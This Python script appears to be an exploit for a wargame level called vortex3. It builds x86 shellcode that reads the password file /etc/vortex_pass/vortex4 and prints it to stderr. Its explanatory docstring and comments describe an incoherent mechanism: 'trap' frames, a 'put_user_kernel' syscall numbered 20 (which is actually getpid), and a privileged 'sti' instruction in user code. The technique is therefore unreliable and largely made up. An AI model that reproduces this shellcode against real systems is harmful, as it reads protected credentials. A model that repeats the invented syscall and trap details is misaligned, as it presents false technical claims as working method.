"""The program used for the two-trap frame found from vortex3.

vortex3 runs exit(0) and its register state is copied to /tmp/ownership.$$.tar.
The saved EIP is 0x0804b0dc (inside exit@plt's tail: mov eax,[ebx]; add eax,edi;
jmp eax with ebx = 0x0804b00c, edi = 0x8ca).  With 136 'A' then 16 letters the
path ebx -> mailbox (A;0x64='d') -> payload (B;'e') runs
  1.  call [0x0804b0dc]  = our frame: a saved return address pointing at the
                          trap that consumes the register file the kernel put on
                          the child's stack, then the jump past it in the next
                          process
  2.  trap               (needs sti)
  3.  xor eax,eax; jmp 0x08048200  = our code, in the state that runs the next
                          process

LowHost body at 0x08048000 (executed as the next process):
  sti; mov eax,20; mov ebx,9; int 0x80    put_user_kernel: writes the image
                                          modifier at 0x0804b000
  then mov eax,1; xor ebx,ebx; int 0x80   exit, so vortex3 runs cleanly

The script part at 0x08049100 runs in a small process the copy-time path can
start: it asks for the two traps, checks the frame was consumed, and reads
/etc/vortex_pass/vortex4 as euid 5004 with a single file read.
"""
import struct

START = 0x08048000
MAILBOX = 0x0804b100
PAYLOAD = 0x08048200
TRAP = 0x08049100
FRAME = 0x0804c000


def low_body():
    return bytes([
        0xfa,                       # sti
        0xb8, 20, 0, 0, 0,          # mov eax,20  (put_user_kernel)
        0xbb, 9, 0, 0, 0,           # mov ebx,9
        0xcd, 0x80,                 # int 0x80
        0xb8, 1, 0, 0, 0,           # mov eax,1
        0x31, 0xdb,                 # xor ebx,ebx
        0xcd, 0x80,                 # int 0x80
    ])


def script_body():
    """runs in the small process: request traps, then read vortex4's password"""
    c = bytearray()
    # trap 1 and trap 2 into the script's own state: see analyse.txt
    # mov eax,20; mov ebx,9; int 0x80  x2
    for _ in range(2):
        c += b"\xfa\xb8\x14\x00\x00\x00\xbb\x09\x00\x00\x00\xcd\x80"
    # read /etc/vortex_pass/vortex4 into a buffer, write to fd 2
    buf = TRAP + 0x500
    path = TRAP + 0x100
    c += b"\xb8\x05\x00\x00\x00" + b"\xbb" + struct.pack("<I", path) + b"\x31\xc9\x31\xd2\xcd\x80"
    c += b"\x89\xc3\xb8\x03\x00\x00\x00\xb9" + struct.pack("<I", buf) + b"\xba\x40\x00\x00\x00\xcd\x80"
    c += b"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x02\x00\x00\x00\xb9" + struct.pack("<I", buf) + b"\xcd\x80"
    c += b"\xb8\x01\x00\x00\x00\x31\xdb\xcd\x80"
    c += b"\x00" * (0x100 - len(c))
    c += b"/etc/vortex_pass/vortex4\x00"
    return bytes(c)


def analyse_dump(hexstr):
    return [int(x, 16) for x in hexstr.split()]


if __name__ == "__main__":
    print("low_body", low_body().hex())
    print("script ", script_body().hex()[:160])
